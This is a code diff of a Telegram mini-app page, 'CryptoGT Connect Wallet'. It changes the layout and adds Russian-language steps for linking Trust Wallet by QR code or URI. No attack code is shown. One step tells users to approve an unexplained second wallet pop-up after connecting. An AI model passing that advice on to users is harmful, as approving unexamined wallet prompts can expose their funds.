@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title> CryptoGT Connect Wallet</title>
+  <title>CryptoGT Connect Wallet</title>
   <style>
     body {
       background: #000;
       color: #e0e0e0;
       font-family: 'Segoe UI', sans-serif;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      padding: 20px;
       margin: 0;
     }
     .container {
@@ -22,6 +22,7 @@
       border-radius: 12px;
       box-shadow: 0 0 20px rgba(0,0,0,0.7);
       text-align: center;
+      margin-bottom: 20px;
     }
     h1 {
       color: #ff9800;
@@ -61,6 +62,20 @@
     .btn:hover {
       background: #ffb74d;
     }
+    .instructions {
+      width: 360px;
+      background: #1a1a1a;
+      padding: 20px;
+      border-radius: 12px;
+      font-size: 14px;
+      line-height: 1.5;
+      color: #ddd;
+    }
+    .instructions h2 {
+      color: #ff9800;
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 <body>
@@ -70,6 +85,17 @@
     <div id="manual-uri">URI будет здесь</div>
     <div id="status">Инициализация...</div>
     <button id="reconnect" class="btn">🔁 Переподключиться</button>
+  </div>
+
+  <div class="instructions">
+    <h2>Как подключить кошелек к CryptoGT:</h2>
+    <ol>
+      <li>Отсканируйте QR-код или вставьте вручную через Trust Wallet</li>
+      <li>Во всплывающем окне нажмите “Connect"</li>
+      <li>Вернитесь в мини-приложение CryptoGT Connect Wallet</li>
+      <li>После статуса «🚀 Отправка подключения» зайдите в Trust Wallet, во всплывающем окне нажмите «Подтвердить»</li>
+      <li>Ваш кошелек успешно подключен и готов к работе с CryptoGT! ✅</li>
+    </ol>
   </div>
 
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
